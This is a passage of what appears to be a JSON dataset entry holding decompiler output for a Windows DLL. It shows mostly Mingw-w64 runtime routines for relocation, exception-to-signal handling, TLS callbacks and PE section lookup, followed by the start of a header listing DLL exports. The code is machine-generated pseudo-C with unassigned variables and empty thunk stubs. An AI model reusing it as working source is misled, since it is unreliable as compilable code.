    "  fwrite(\"Mingw-w64 runtime failure:\\n\", 1u, 0x1Bu, v2);",
    "  v3 = (FILE *)sub_62749A60(2);",
    "  vfprintf(v3, Format, va);",
    "  abort();",
    "}",
    "",
    "",
    "int __fastcall sub_62748810(_QWORD *a1, char *a2, unsigned int a3)",
    "{",
    "  __int64 v3; // rdi",
    "  int v7; // ecx",
    "  _QWORD *v8; // rax",
    "  __int64 v9; // rbp",
    "  __int64 v10; // rdi",
    "  __int64 v11; // rax",
    "  const void *v12; // rcx",
    "  unsigned __int64 v13; // rcx",
    "  char *v14; // r12",
    "  char *v15; // rsi",
    "  unsigned int v16; // ebx",
    "  unsigned int v17; // ebx",
    "  __int64 v18; // rdx",
    "  void *v19; // rcx",
    "  SIZE_T v20; // rdx",
    "  __int64 v21; // rdi",
    "  DWORD LastError; // eax",
    "  _BYTE Buffer[88]; // [rsp+20h] [rbp-58h] BYREF",
    "",
    "  v3 = dword_62751824;",
    "  if ( dword_62751824 <= 0 )",
    "  {",
    "    v3 = 0;",
    "LABEL_6:",
    "    v9 = sub_62749510(a1);",
    "    if ( !v9 )",
    "      sub_627487A0(\"Address %p has no image-section\", a1);",
    "    v10 = 40 * v3;",
    "    v11 = v10 + qword_62751828;",
    "    *(_QWORD *)(v11 + 32) = v9;",
    "    *(_DWORD *)v11 = 0;",
    "    v12 = (const void *)(sub_62749640() + *(unsigned int *)(v9 + 12));",
    "    *(_QWORD *)(qword_62751828 + v10 + 24) = v12;",
    "    if ( !VirtualQuery(v12, (PMEMORY_BASIC_INFORMATION)Buffer, 0x30u) )",
    "      sub_627487A0(",
    "        \"  VirtualQuery failed for %d bytes at address %p\",",
    "        *(_DWORD *)(v9 + 8),",
    "        *(const void **)(qword_62751828 + v10 + 24));",
    "    LODWORD(v8) = *(_DWORD *)&Buffer[36];",
    "    if ( ((*(_DWORD *)&Buffer[36] - 64) & 0xFFFFFFBF) != 0 )",
    "    {",
    "      LODWORD(v8) = (*(_DWORD *)&Buffer[36] - 4) & 0xFFFFFFFB;",
    "      if ( (_DWORD)v8 )",
    "      {",
    "        v19 = *(void **)Buffer;",
    "        v20 = *(_QWORD *)&Buffer[24];",
    "        v21 = qword_62751828 + v10;",
    "        *(_QWORD *)(v21 + 8) = *(_QWORD *)Buffer;",
    "        *(_QWORD *)(v21 + 16) = v20;",
    "        LODWORD(v8) = VirtualProtect(v19, v20, 0x40u, (PDWORD)v21);",
    "        if ( !(_DWORD)v8 )",
    "        {",
    "          LastError = GetLastError();",
    "          sub_627487A0(\"  VirtualProtect failed with code 0x%x\", LastError);",
    "        }",
    "      }",
    "    }",
    "    ++dword_62751824;",
    "  }",
    "  else",
    "  {",
    "    v7 = 0;",
    "    v8 = (_QWORD *)(qword_62751828 + 24);",
    "    while ( (unsigned __int64)a1 < *v8 || (unsigned __int64)a1 >= (unsigned __int64)*(unsigned int *)(v8[1] + 8LL) + *v8 )",
    "    {",
    "      ++v7;",
    "      v8 += 5;",
    "      if ( v7 == dword_62751824 )",
    "        goto LABEL_6;",
    "    }",
    "  }",
    "  if ( a3 >= 8 )",
    "  {",
    "    v13 = (unsigned __int64)(a1 + 1) & 0xFFFFFFFFFFFFFFF8uLL;",
    "    *a1 = *(_QWORD *)a2;",
    "    LODWORD(v8) = a3;",
    "    *(_QWORD *)((char *)a1 + a3 - 8) = *(_QWORD *)&a2[a3 - 8];",
    "    v14 = (char *)a1 - v13;",
    "    v15 = (char *)(a2 - v14);",
    "    v16 = ((_DWORD)v14 + a3) & 0xFFFFFFF8;",
    "    if ( v16 >= 8 )",
    "    {",
    "      v17 = v16 & 0xFFFFFFF8;",
    "      LODWORD(v8) = 0;",
    "      do",
    "      {",
    "        v18 = (unsigned int)v8;",
    "        LODWORD(v8) = (_DWORD)v8 + 8;",
    "        *(_QWORD *)(v13 + v18) = *(_QWORD *)&v15[v18];",
    "      }",
    "      while ( (unsigned int)v8 < v17 );",
    "    }",
    "  }",
    "  else if ( (a3 & 4) != 0 )",
    "  {",
    "    *(_DWORD *)a1 = *(_DWORD *)a2;",
    "    LODWORD(v8) = *(_DWORD *)&a2[a3 - 4];",
    "    *(_DWORD *)((char *)a1 + a3 - 4) = (_DWORD)v8;",
    "  }",
    "  else if ( a3 )",
    "  {",
    "    LODWORD(v8) = (unsigned __int8)*a2;",
    "    *(_BYTE *)a1 = (_BYTE)v8;",
    "    if ( (a3 & 2) != 0 )",
    "    {",
    "      LODWORD(v8) = *(unsigned __int16 *)&a2[a3 - 2];",
    "      *(_WORD *)((char *)a1 + a3 - 2) = (_WORD)v8;",
    "    }",
    "  }",
    "  return (int)v8;",
    "}",
    "",
    "",
    "void sub_62748A20()",
    "{",
    "  signed __int64 v0; // rax",
    "  void *v1; // rsp",
    "  char v2; // [rsp+20h] [rbp-60h] BYREF",
    "",
    "  if ( !dword_62751820 )",
    "  {",
    "    dword_62751820 = 1;",
    "    sub_627495A0();",
    "    v0 = sub_627497D0();",
    "    dword_62751824 = 0;",
    "    v1 = alloca(v0);",
    "    qword_62751828 = (__int64)&v2;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62748D10(unsigned int *a1)",
    "{",
    "  unsigned int v1; // eax",
    "  _crt_signal_t v2; // rax",
    "  __int64 v3; // rdx",
    "  unsigned int v4; // r8d",
    "  _crt_signal_t v6; // rax",
    "  _crt_signal_t v7; // rax",
    "",
    "  v1 = *a1;",
    "  if ( *a1 > 0xC0000096 )",
    "    return 1;",
    "  if ( v1 > 0xC000008B )",
    "  {",
    "    switch ( v1 )",
    "    {",
    "      case 0xC000008D:",
    "      case 0xC000008E:",
    "      case 0xC000008F:",
    "      case 0xC0000090:",
    "      case 0xC0000091:",
    "      case 0xC0000093:",
    "        v2 = signal(8, 0);",
    "        if ( v2 != (_crt_signal_t)1 )",
    "          goto LABEL_17;",
    "        signal(8, (_crt_signal_t)1);",
    "        sub_627497C0();",
    "        goto LABEL_6;",
    "      case 0xC0000094:",
    "        v2 = signal(8, 0);",
    "        if ( v2 == (_crt_signal_t)1 )",
    "        {",
    "          signal(8, (_crt_signal_t)1);",
    "          return 0;",
    "        }",
    "        else",
    "        {",
    "LABEL_17:",
    "          v4 = 1;",
    "          if ( v2 )",
    "          {",
    "            ((void (__fastcall *)(__int64, __int64, __int64))v2)(8, v3, 1);",
    "            return 0;",
    "          }",
    "        }",
    "        return v4;",
    "      case 0xC0000096:",
    "        goto LABEL_12;",
    "      default:",
    "LABEL_6:",
    "        v4 = 0;",
    "        break;",
    "    }",
    "    return v4;",
    "  }",
    "  if ( v1 == -1073741819 )",
    "  {",
    "    v7 = signal(11, 0);",
    "    if ( v7 == (_crt_signal_t)1 )",
    "    {",
    "      signal(11, (_crt_signal_t)1);",
    "      return 0;",
    "    }",
    "    if ( !v7 )",
    "      return 4;",
    "    ((void (__fastcall *)(__int64))v7)(11);",
    "    return 0;",
    "  }",
    "  if ( v1 > 0xC0000005 )",
    "  {",
    "    v4 = 0;",
    "    if ( v1 != -1073741816 )",
    "    {",
    "      if ( v1 == -1073741795 )",
    "      {",
    "LABEL_12:",
    "        v6 = signal(4, 0);",
    "        if ( v6 == (_crt_signal_t)1 )",
    "        {",
    "          signal(4, (_crt_signal_t)1);",
    "          return 0;",
    "        }",
    "        if ( v6 )",
    "        {",
    "          ((void (__fastcall *)(__int64))v6)(4);",
    "          return 0;",
    "        }",
    "        return 4;",
    "      }",
    "      return 1;",
    "    }",
    "    return v4;",
    "  }",
    "  return v1 != -2147483646;",
    "}",
    "",
    "",
    "__int64 sub_62748ED0()",
    "{",
    "  ULONG64 v0; // rsi",
    "  __int64 result; // rax",
    "  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *v2; // rbx",
    "  __int64 v3; // r12",
    "  _DWORD *v4; // rdi",
    "  DWORD v5; // edx",
    "  DWORD v6; // edx",
    "  int v7; // eax",
    "  __int64 v8; // rax",
    "  ULONG v9; // edx",
    "",
    "  v0 = sub_62749640();",
    "  result = (unsigned int)dword_62751848;",
    "  if ( !dword_62751848 && v0 )",
    "  {",
    "    dword_62751848 = 1;",
    "    if ( !sub_62749470(\".pdata\") )",
    "    {",
    "      v2 = &FunctionTable;",
    "      v3 = 0;",
    "      memset(&FunctionTable, 0, 0x180u);",
    "      memset(&unk_62751860, 0, 0x100u);",
    "      v4 = &unk_62751860;",
    "      while ( 1 )",
    "      {",
    "        v8 = sub_627495D0(v3);",
    "        if ( !v8 )",
    "          break;",
    "        *(_BYTE *)v4 = 9;",
    "        ++v3;",
    "        ++v2;",
    "        v4[1] = (unsigned int)sub_62748D10 - v0;",
    "        v5 = *(_DWORD *)(v8 + 12);",
    "        v2[-1].BeginAddress = v5;",
    "        v6 = *(_DWORD *)(v8 + 8) + v5;",
    "        v7 = (int)v4;",
    "        v4 += 2;",
    "        v2[-1].EndAddress = v6;",
    "        v2[-1].UnwindInfoAddress = v7 - v0;",
    "        if ( v3 == 32 )",
    "        {",
    "          v9 = 32;",
    "          goto LABEL_12;",
    "        }",
    "      }",
    "      if ( !v3 )",
    "        return 1;",
    "      v9 = v3;",
    "LABEL_12:",
    "      RtlAddFunctionTable(&FunctionTable, v9, v0);",
    "    }",
    "    return 1;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62748FD0(unsigned int **a1)",
    "{",
    "  unsigned int v1; // eax",
    "  _crt_signal_t v3; // rax",
    "  __int64 result; // rax",
    "  _crt_signal_t v5; // rax",
    "  _crt_signal_t v6; // rax",
    "",
    "  v1 = **a1;",
    "  if ( (v1 & 0x20FFFFFF) == 0x20474343 && ((*a1)[1] & 1) == 0 )",
    "    return 0xFFFFFFFFLL;",
    "  if ( v1 > 0xC0000096 )",
    "    goto LABEL_16;",
    "  if ( v1 <= 0xC000008B )",
    "  {",
    "    if ( v1 == -1073741819 )",
    "    {",
    "      v6 = signal(11, 0);",
    "      if ( v6 == (_crt_signal_t)1 )",
    "      {",
    "        signal(11, (_crt_signal_t)1);",
    "        return 0xFFFFFFFFLL;",
    "      }",
    "      if ( v6 )",
    "      {",
    "        ((void (__fastcall *)(__int64))v6)(11);",
    "        return 0xFFFFFFFFLL;",
    "      }",
    "      goto LABEL_16;",
    "    }",
    "    if ( v1 > 0xC0000005 )",
    "    {",
    "      if ( v1 != -1073741816 )",
    "      {",
    "        if ( v1 == -1073741795 )",
    "        {",
    "LABEL_12:",
    "          v5 = signal(4, 0);",
    "          if ( v5 == (_crt_signal_t)1 )",
    "          {",
    "            signal(4, (_crt_signal_t)1);",
    "            return 0xFFFFFFFFLL;",
    "          }",
    "          if ( v5 )",
    "          {",
    "            ((void (__fastcall *)(__int64))v5)(4);",
    "            return 0xFFFFFFFFLL;",
    "          }",
    "        }",
    "        goto LABEL_16;",
    "      }",
    "      return 0xFFFFFFFFLL;",
    "    }",
    "    if ( v1 == -2147483646 )",
    "      return 0xFFFFFFFFLL;",
    "LABEL_16:",
    "    if ( qword_62751840 )",
    "      return qword_62751840(a1);",
    "    else",
    "      return 0;",
    "  }",
    "  switch ( v1 )",
    "  {",
    "    case 0xC000008D:",
    "    case 0xC000008E:",
    "    case 0xC000008F:",
    "    case 0xC0000090:",
    "    case 0xC0000091:",
    "    case 0xC0000093:",
    "      v3 = signal(8, 0);",
    "      if ( v3 != (_crt_signal_t)1 )",
    "        goto LABEL_22;",
    "      signal(8, (_crt_signal_t)1);",
    "      sub_627497C0();",
    "      return 0xFFFFFFFFLL;",
    "    case 0xC0000094:",
    "      v3 = signal(8, 0);",
    "      if ( v3 == (_crt_signal_t)1 )",
    "      {",
    "        signal(8, (_crt_signal_t)1);",
    "        result = 0xFFFFFFFFLL;",
    "      }",
    "      else",
    "      {",
    "LABEL_22:",
    "        if ( !v3 )",
    "          goto LABEL_16;",
    "        ((void (__fastcall *)(__int64))v3)(8);",
    "        result = 0xFFFFFFFFLL;",
    "      }",
    "      break;",
    "    case 0xC0000096:",
    "      goto LABEL_12;",
    "    default:",
    "      return 0xFFFFFFFFLL;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void sub_62749180()",
    "{",
    "  _QWORD *v0; // rbx",
    "  LPVOID Value; // r12",
    "",
    "  EnterCriticalSection(&CriticalSection);",
    "  v0 = Block;",
    "  if ( Block )",
    "  {",
    "    do",
    "    {",
    "      Value = TlsGetValue(*(_DWORD *)v0);",
    "      if ( !GetLastError() && Value )",
    "        ((void (__fastcall *)(LPVOID))v0[1])(Value);",
    "      v0 = (_QWORD *)v0[2];",
    "    }",
    "    while ( v0 );",
    "  }",
    "  LeaveCriticalSection(&CriticalSection);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_627491F0(int a1, __int64 a2)",
    "{",
    "  __int64 result; // rax",
    "  _QWORD *v5; // rax",
    "  _QWORD *v6; // rbx",
    "  void *v7; // rax",
    "",
    "  result = (unsigned int)dword_62751AE8;",
    "  if ( dword_62751AE8 )",
    "  {",
    "    v5 = calloc(1u, 0x18u);",
    "    v6 = v5;",
    "    if ( v5 )",
    "    {",
    "      *(_DWORD *)v5 = a1;",
    "      v5[1] = a2;",
    "      EnterCriticalSection(&CriticalSection);",
    "      v7 = Block;",
    "      Block = v6;",
    "      v6[2] = v7;",
    "      LeaveCriticalSection(&CriticalSection);",
    "      return 0;",
    "    }",
    "    else",
    "    {",
    "      return 0xFFFFFFFFLL;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62749270(int a1)",
    "{",
    "  _QWORD *v3; // rcx",
    "  _QWORD *v4; // rdx",
    "  __int64 v5; // rax",
    "",
    "  if ( !dword_62751AE8 )",
    "    return 0;",
    "  EnterCriticalSection(&CriticalSection);",
    "  v3 = Block;",
    "  if ( Block )",
    "  {",
    "    v4 = 0;",
    "    while ( 1 )",
    "    {",
    "      v5 = v3[2];",
    "      if ( *(_DWORD *)v3 == a1 )",
    "        break;",
    "      v4 = v3;",
    "      if ( !v5 )",
    "        goto LABEL_11;",
    "      v3 = (_QWORD *)v3[2];",
    "    }",
    "    if ( v4 )",
    "      v4[2] = v5;",
    "    else",
    "      Block = (void *)v3[2];",
    "    free(v3);",
    "  }",
    "LABEL_11:",
    "  LeaveCriticalSection(&CriticalSection);",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62749300(__int64 a1, unsigned int a2)",
    "{",
    "  void *v3; // rbx",
    "  void *v4; // rcx",
    "",
    "  if ( a2 == 2 )",
    "  {",
    "    sub_627497C0();",
    "    return 1;",
    "  }",
    "  else",
    "  {",
    "    if ( a2 > 2 )",
    "    {",
    "      if ( a2 == 3 && dword_62751AE8 )",
    "        sub_62749180();",
    "    }",
    "    else if ( a2 )",
    "    {",
    "      if ( !dword_62751AE8 )",
    "        InitializeCriticalSection(&CriticalSection);",
    "      dword_62751AE8 = 1;",
    "    }",
    "    else",
    "    {",
    "      if ( dword_62751AE8 )",
    "        sub_62749180();",
    "      if ( dword_62751AE8 == 1 )",
    "      {",
    "        v3 = Block;",
    "        while ( v3 )",
    "        {",
    "          v4 = v3;",
    "          v3 = (void *)*((_QWORD *)v3 + 2);",
    "          free(v4);",
    "        }",
    "        Block = 0;",
    "        dword_62751AE8 = 0;",
    "        DeleteCriticalSection(&CriticalSection);",
    "      }",
    "    }",
    "    return 1;",
    "  }",
    "}",
    "",
    "",
    "const char *__fastcall sub_62749470(char *Str2)",
    "{",
    "  const char *v2; // r12",
    "  __int64 v3; // rcx",
    "  __int64 v4; // rcx",
    "  __int64 v5; // rsi",
    "",
    "  if ( strlen(Str2) <= 8 )",
    "  {",
    "    v2 = 0;",
    "    if ( *(_WORD *)off_6274DFD0 != 23117 || !(unsigned int)sub_627493E0() )",
    "      return v2;",
    "    v4 = *(int *)(v3 + 60) + v3;",
    "    v2 = (const char *)(v4 + *(unsigned __int16 *)(v4 + 20) + 24);",
    "    if ( *(_WORD *)(v4 + 6) )",
    "    {",
    "      v5 = (__int64)&v2[40 * *(unsigned __int16 *)(v4 + 6)];",
    "      while ( strncmp(v2, Str2, 8u) )",
    "      {",
    "        v2 += 40;",
    "        if ( v2 == (const char *)v5 )",
    "          return 0;",
    "      }",
    "      return v2;",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62749510(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v2; // r8",
    "  __int64 v3; // r9",
    "  __int64 v4; // r10",
    "  unsigned __int64 v5; // rcx",
    "  __int64 v6; // r10",
    "  __int64 v7; // r9",
    "  unsigned __int64 v8; // rdx",
    "",
    "  v2 = 0;",
    "  if ( *(_WORD *)off_6274DFD0 == 23117 && (unsigned int)sub_627493E0(off_6274DFD0, a2, 0, a1) )",
    "  {",
    "    v5 = v3 - v4;",
    "    v6 = *(int *)(v4 + 60) + v4;",
    "    v2 = v6 + *(unsigned __int16 *)(v6 + 20) + 24;",
    "    if ( *(_WORD *)(v6 + 6) )",
    "    {",
    "      v7 = v2 + 40LL * ((unsigned int)*(unsigned __int16 *)(v6 + 6) - 1) + 40;",
    "      while ( 1 )",
    "      {",
    "        v8 = *(unsigned int *)(v2 + 12);",
    "        if ( v5 >= v8 && v5 < (unsigned int)(*(_DWORD *)(v2 + 8) + v8) )",
    "          break;",
    "        v2 += 40;",
    "        if ( v2 == v7 )",
    "          return 0;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      return 0;",
    "    }",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_627495A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  __int64 result; // rax",
    "  __int64 v5; // rcx",
    "",
    "  result = 0;",
    "  if ( *(_WORD *)off_6274DFD0 == 23117 )",
    "  {",
    "    result = sub_627493E0(off_6274DFD0, a2, a3, a4);",
    "    if ( (_DWORD)result )",
    "      return *(unsigned __int16 *)(*(int *)(v5 + 60) + v5 + 6);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_627495D0(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v2; // r8",
    "  __int64 v3; // rcx",
    "  __int64 v4; // r9",
    "  __int64 v5; // rcx",
    "  __int64 v6; // rax",
    "",
    "  v2 = 0;",
    "  if ( *(_WORD *)off_6274DFD0 == 23117 && (unsigned int)sub_627493E0(off_6274DFD0, a2, 0, a1) )",
    "  {",
    "    v5 = *(int *)(v3 + 60) + v3;",
    "    v2 = v5 + *(unsigned __int16 *)(v5 + 20) + 24;",
    "    if ( *(_WORD *)(v5 + 6) )",
    "    {",
    "      v6 = v2 + 40LL * ((unsigned int)*(unsigned __int16 *)(v5 + 6) - 1) + 40;",
    "      do",
    "      {",
    "        if ( (*(_BYTE *)(v2 + 39) & 0x20) != 0 )",
    "        {",
    "          if ( !v4 )",
    "            return v2;",
    "          --v4;",
    "        }",
    "        v2 += 40;",
    "      }",
    "      while ( v2 != v6 );",
    "    }",
    "    return 0;",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62749640(__int64 a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  __int64 v4; // r8",
    "  __int64 v5; // rcx",
    "",
    "  v4 = 0;",
    "  if ( *(_WORD *)off_6274DFD0 == 23117 && (unsigned int)sub_627493E0(off_6274DFD0, a2, 0, a4) )",
    "    return v5;",
    "  return v4;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62749670(__int64 a1, __int64 a2)",
    "{",
    "  __int64 result; // rax",
    "  __int64 v3; // r8",
    "  __int64 v4; // r9",
    "  unsigned __int64 v5; // rcx",
    "  __int64 v6; // r9",
    "  _DWORD *v7; // rax",
    "  __int64 v8; // r9",
    "  unsigned __int64 v9; // r8",
    "",
    "  result = 0;",
    "  if ( *(_WORD *)off_6274DFD0 == 23117 )",
    "  {",
    "    result = sub_627493E0(off_6274DFD0, a2, a1, off_6274DFD0);",
    "    if ( (_DWORD)result )",
    "    {",
    "      v5 = v3 - v4;",
    "      v6 = *(int *)(v4 + 60) + v4;",
    "      v7 = (_DWORD *)(v6 + *(unsigned __int16 *)(v6 + 20) + 24);",
    "      if ( *(_WORD *)(v6 + 6) )",
    "      {",
    "        v8 = (__int64)&v7[10 * *(unsigned __int16 *)(v6 + 6)];",
    "        while ( 1 )",
    "        {",
    "          v9 = (unsigned int)v7[3];",
    "          if ( v5 >= v9 && v5 < (unsigned int)(v7[2] + v9) )",
    "            break;",
    "          v7 += 10;",
    "          if ( v7 == (_DWORD *)v8 )",
    "            return 0;",
    "        }",
    "        return v7[9] >= 0;",
    "      }",
    "      else",
    "      {",
    "        return 0;",
    "      }",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62749700(unsigned int a1, __int64 a2)",
    "{",
    "  __int64 v2; // r9",
    "  int v3; // r8d",
    "  __int64 v4; // r11",
    "  __int64 v5; // rcx",
    "  unsigned __int64 v6; // rax",
    "  __int64 v7; // rdx",
    "  int v8; // ecx",
    "  __int64 v9; // r10",
    "  unsigned __int64 v10; // r9",
    "  __int64 i; // rax",
    "",
    "  v2 = 0;",
    "  if ( *(_WORD *)off_6274DFD0 == 23117 )",
    "  {",
    "    if ( (unsigned int)sub_627493E0(off_6274DFD0, a2, a1, 0) )",
    "    {",
    "      v5 = v4 + *(int *)(v4 + 60);",
    "      v6 = *(unsigned int *)(v5 + 144);",
    "      if ( (_DWORD)v6 )",
    "      {",
    "        v7 = v5 + *(unsigned __int16 *)(v5 + 20) + 24;",
    "        v8 = *(unsigned __int16 *)(v5 + 6);",
    "        if ( v8 )",
    "        {",
    "          v9 = v7 + 40LL * (unsigned int)(v8 - 1) + 40;",
    "          while ( 1 )",
    "          {",
    "            v10 = *(unsigned int *)(v7 + 12);",
    "            if ( v6 >= v10 && v6 < (unsigned int)(*(_DWORD *)(v7 + 8) + v10) )",
    "              break;",
    "            v7 += 40;",
    "            if ( v7 == v9 )",
    "              return 0;",
    "          }",
    "          for ( i = v4 + v6; *(_DWORD *)(i + 4) || *(_DWORD *)(i + 12); i += 20 )",
    "          {",
    "            if ( v3 <= 0 )",
    "              return v4 + *(unsigned int *)(i + 12);",
    "            --v3;",
    "          }",
    "          return 0;",
    "        }",
    "      }",
    "    }",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "void sub_627497C0()",
    "{",
    "  __asm { fninit }",
    "}",
    "",
    "",
    "void *__fastcall sub_627497D0()",
    "{",
    "  unsigned __int64 v0; // rax",
    "  __int64 *v1; // rcx",
    "  _UNKNOWN *retaddr; // [rsp+8h] [rbp+0h]",
    "  __int64 v4; // [rsp+20h] [rbp+18h] BYREF",
    "",
    "  v1 = &v4;",
    "  if ( v0 >= 0x1000 )",
    "  {",
    "    do",
    "    {",
    "      v1 -= 512;",
    "      *v1 = *v1;",
    "      v0 -= 4096LL;",
    "    }",
    "    while ( v0 > 0x1000 );",
    "  }",
    "  *(__int64 *)((char *)v1 - v0) = *(__int64 *)((char *)v1 - v0);",
    "  return retaddr;",
    "}",
    "",
    "",
    "__int64 sub_62749810()",
    "{",
    "  return 1;",
    "}",
    "",
    "",
    "// attributes: thunk",
    "int __cdecl wcsncmp(const wchar_t *String1, const wchar_t *String2, size_t MaxCount)",
    "{",
    "}// attributes: thunk",
    "size_t __cdecl wcslen(const wchar_t *String)",
    "{",
    "}// attributes: thunk",
    "wchar_t *__cdecl wcscpy(wchar_t *Destination, const wchar_t *Source)",
    "{",
    "}// attributes: thunk",
    "int __cdecl wcscmp(const wchar_t *String1, const wchar_t *String2)",
    "{",
    "}// attributes: thunk",
    "wchar_t *__cdecl wcscat(wchar_t *Destination, const wchar_t *Source)",
    "{",
    "}// attributes: thunk",
    "int __cdecl vfprintf(FILE *const Stream, const char *const Format, va_list ArgList)",
    "{",
    "}// attributes: thunk",
    "int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount)",
    "{",
    "}// attributes: thunk",
    "size_t __cdecl strlen(const char *Str)",
    "{",
    "}// attributes: thunk",
    "char *__cdecl strcpy(char *Destination, const char *Source)",
    "{",
    "}// attributes: thunk",
    "char *__cdecl strcat(char *Destination, const char *Source)",
    "{",
    "}// attributes: thunk",
    "void __cdecl srand(unsigned int Seed)",
    "{",
    "}// attributes: thunk",
    "_crt_signal_t __cdecl signal(int Signal, _crt_signal_t Function)",
    "{",
    "}// attributes: thunk",
    "int __cdecl rand()",
    "{",
    "}// attributes: thunk",
    "void *__cdecl memset(void *a1, int Val, size_t Size)",
    "{",
    "}// attributes: thunk",
    "void *__cdecl memcpy(void *a1, const void *Src, size_t Size)",
    "{",
    "}// attributes: thunk",
    "size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream)",
    "{",
    "}// attributes: thunk",
    "void __cdecl free(void *Block)",
    "{",
    "}// attributes: thunk",
    "void *__cdecl calloc(size_t Count, size_t Size)",
    "{",
    "}// attributes: thunk",
    "void __cdecl  abort()",
    "{",
    "}// attributes: thunk",
    "void __cdecl initterm(_PVFV *First, _PVFV *Last)",
    "{",
    "}// attributes: thunk",
    "__int64 __fastcall amsg_exit(__int64 a1)",
    "{",
    "}__int64 __fastcall sub_62749900(__int64 a1, __int64 a2)",
    "{",
    "  char *v4; // rax",
    "  char *v5; // rdx",
    "  __int64 v7; // rsi",
    "  char *v8; // rax",
    "  char *v9; // rdx",
    "  char *v10; // rdx",
    "",
    "  if ( !a1 )",
    "    return 0xFFFFFFFFLL;",
    "  lock(8);",
    "  if ( *(_QWORD *)a1 )",
    "  {",
    "    v4 = *(char **)(a1 + 8);",
    "    v5 = *(char **)(a1 + 16);",
    "LABEL_4:",
    "    if ( v5 != v4 )",
    "    {",
    "LABEL_5:",
    "      *(_QWORD *)(a1 + 8) = v4 + 8;",
    "      *(_QWORD *)v4 = a2;",
    "      unlock(8, v4 + 8);",
    "      return 0;",
    "    }",
    "    v7 = (__int64)&v4[-*(_QWORD *)a1];",
    "    v8 = (char *)realloc(*(void **)a1, 16 * (v7 >> 3));",
    "    v9 = v8;",
    "    if ( v8 )",
    "    {",
    "      v10 = &v8[16 * (v7 >> 3)];",
    "      *(_QWORD *)a1 = v8;",
    "      v4 = &v8[v7];",
    "      *(_QWORD *)(a1 + 16) = v10;",
    "      goto LABEL_5;",
    "    }",
    "    goto LABEL_11;",
    "  }",
    "  v4 = (char *)calloc(0x20u, 8u);",
    "  *(_QWORD *)a1 = v4;",
    "  if ( v4 )",
    "  {",
    "    v5 = v4 + 256;",
    "    *(_QWORD *)(a1 + 8) = v4;",
    "    *(_QWORD *)(a1 + 16) = v4 + 256;",
    "    goto LABEL_4;",
    "  }",
    "LABEL_11:",
    "  unlock(8, v9);",
    "  return 0xFFFFFFFFLL;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_627499E0(__int64 a1)",
    "{",
    "  void (**v2)(void); // r12",
    "  void (**v3)(void); // rbx",
    "  __int64 v4; // rdx",
    "",
    "  lock(8);",
    "  v2 = *(void (***)(void))a1;",
    "  v3 = *(void (***)(void))(a1 + 8);",
    "  *(_QWORD *)(a1 + 16) = 0;",
    "  *(_QWORD *)(a1 + 8) = 0;",
    "  *(_QWORD *)a1 = 0;",
    "  unlock(8, v4);",
    "  if ( v2 )",
    "  {",
    "    while ( v2 <= --v3 )",
    "    {",
    "      while ( *v3 )",
    "      {",
    "        (*v3--)();",
    "        if ( v2 > v3 )",
    "          goto LABEL_5;",
    "      }",
    "    }",
    "LABEL_5:",
    "    free(v2);",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "FILE *__fastcall sub_62749A60(int a1)",
    "{",
    "  return &_iob_func()[a1];",
    "}",
    "",
    "",
    "// attributes: thunk",
    "void *__cdecl realloc(void *Block, size_t Size)",
    "{",
    "}// attributes: thunk",
    "__int64 __fastcall unlock(__int64 a1, __int64 a2)",
    "{",
    "}// attributes: thunk",
    "__int64 __fastcall lock(__int64 a1)",
    "{",
    "}// attributes: thunk",
    "FILE *__cdecl _iob_func()",
    "{",
    "}"
  ],
  "h_code": [
    "#include <windows.h>",
    "#include <stdint.h>",
    "#include <stdio.h>",
    "",
    "#include \"defs.h\"",
    "",
    "void JUMPOUT(int a) {",
    "}",
    "",
    "unsigned int _bss_start__ = 0;",
    "unsigned int __cxa_finalize = 0;",
    "__int64 __fastcall sub_62741010(__int64 a1, int a2, __int64 a3);",
    "__int64 __fastcall sub_62741200(void *a1, unsigned int a2, __int64 a3);",
    "BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);",
    "__int64 __fastcall StartAddress(HMODULE lpThreadParameter);",
    "void sub_627413F0();",
    "__int64 __fastcall sub_62741420(LPVOID lpParameter, int a2);",
    "HRESULT __stdcall DllRegisterServer();",
    "__int64 DllRegisterServerEx();",
    "HRESULT __stdcall DllGetClassObject(const IID *const rclsid, const IID *const riid, LPVOID *ppv);",
    "HRESULT __stdcall DllUnregisterServer();",
    "void Start();",
    "_BYTE *__fastcall sub_62741530(_BYTE *a1, _BYTE *a2, int a3);",
    "_BYTE *__fastcall sub_62741690(_BYTE *a1, _BYTE *a2, int a3);",
    "int sub_627417F0(wchar_t *a1, size_t a2, const wchar_t *a3, ...);",
    "__int64 __fastcall sub_62741810(__int64 a1);",
    "__int64 sub_62741A50();",
    "__int64 sub_62741B10();",
    "__int64 sub_62741B60();",
    "__int64 sub_62741CD0();",
    "__int64 sub_62741D50();",
    "__int64 __fastcall sub_62741DE0(HMODULE hModule);",
    "char *__fastcall sub_62741F30(",
    "        __int64 a1,",
    "        __int64 a2,",
    "        unsigned __int16 a3,",
    "        int a4,",
    "        __int64 a5,",
    "        WCHAR *String,",
    "        __int64 a7,",
    "        int a8,",
    "        _DWORD *a9,",
